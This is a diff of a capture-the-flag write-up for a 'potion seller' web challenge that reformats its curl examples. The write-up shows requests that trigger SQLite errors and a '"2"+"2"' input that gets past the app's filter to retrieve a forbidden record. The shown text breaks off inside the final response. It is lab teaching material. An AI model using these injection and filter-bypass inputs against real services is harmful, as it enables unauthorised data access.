@@ -5,8 +5,10 @@
 A website that displays potions, it is a reference to a meme ([source](https://knowyourmeme.com/memes/potion-seller)).
 
 We can get the potions in json at ```/potions```.
+```bash
+curl https://potionseller.secu-web.blackfoot.dev/potions
+```
 ```json
-$ curl https://potionseller.secu-web.blackfoot.dev/potions
 {
   "potions": [
     {
@@ -56,8 +58,10 @@ $ curl https://potionseller.secu-web.blackfoot.dev/potions
 ```
 
 We can get a specific potion at ```/potions/{potion id}```, for example:
+```bash
+curl https://potionseller.secu-web.blackfoot.dev/potions/1
+```
 ```json
-$ curl https://potionseller.secu-web.blackfoot.dev/potions/1
 {
   "potion": {
     "id": 1,
@@ -71,16 +75,20 @@ $ curl https://potionseller.secu-web.blackfoot.dev/potions/1
 ```
 
 We can't get the strongest potion (potion 4) that way:
+```bash
+curl https://potionseller.secu-web.blackfoot.dev/potions/4
+```
 ```json
-$ curl https://potionseller.secu-web.blackfoot.dev/potions/4
 {
   "err": "That potion is too strong for you, traveller!"
 }
 ```
 
 Trying to put some characters instead of a number will result in an error:
+```bash
+curl https://potionseller.secu-web.blackfoot.dev/potions/\=
+```
 ```json
-$ curl https://potionseller.secu-web.blackfoot.dev/potions/\=
 {
   "err": "That looks like code! I don't like code, only potions!"
 }
@@ -88,28 +96,36 @@ $ curl https://potionseller.secu-web.blackfoot.dev/potions/\=
 "code" chars: '=', ';', ':', '{', '}', '[', ']', '(', ')', '!'
 
 Trying to make 4 with operations can be detected:
+```bash
+curl https://potionseller.secu-web.blackfoot.dev/potions/1+3
+```
 ```json
-$ curl https://potionseller.secu-web.blackfoot.dev/potions/1+3
 {
   "err": "Nice try, but that operation adds up to 4! I'm telling you, this potion is too strong!"
 }
 ```
+```bash
+curl https://potionseller.secu-web.blackfoot.dev/potions/2\*2
+```
 ```json
-$ curl https://potionseller.secu-web.blackfoot.dev/potions/2\*2
 {
   "err": "Nice try, but that operation adds up to 4! I'm telling you, this potion is too strong!"
 }
 ```
 
 Other interesting results:
+```bash
+curl https://potionseller.secu-web.blackfoot.dev/potions/dragon
+```
 ```json
-$ curl https://potionseller.secu-web.blackfoot.dev/potions/dragon
 {
   "err": "There was an error querying the SQLite database: Error: SQLITE_ERROR: no such column: dragon"
 }
 ```
+```bash
+curl https://potionseller.secu-web.blackfoot.dev/potions/id
+```
 ```json
-$ curl https://potionseller.secu-web.blackfoot.dev/potions/id
 {
   "potion": {
     "id": 0,
@@ -121,16 +137,20 @@ $ curl https://potionseller.secu-web.blackfoot.dev/potions/id
   }
 }
 ```
+```bash
+curl https://potionseller.secu-web.blackfoot.dev/potions/name
+```
 ```json
-$ curl https://potionseller.secu-web.blackfoot.dev/potions/name
 {}
 ```
 
 ## Solution
 
-Adding "2"+"2" isn't detected like the operations mentionned above, not sure why:
+```"2"+"2"``` isn't detected like the operations mentionned above (not sure why):
+```bash
+curl 'https://potionseller.secu-web.blackfoot.dev/potions/"2"+"2"'
+```
 ```json
-$ curl 'https://potionseller.secu-web.blackfoot.dev/potions/"2"+"2"'
 {
   "potion": {
     "id": 4,
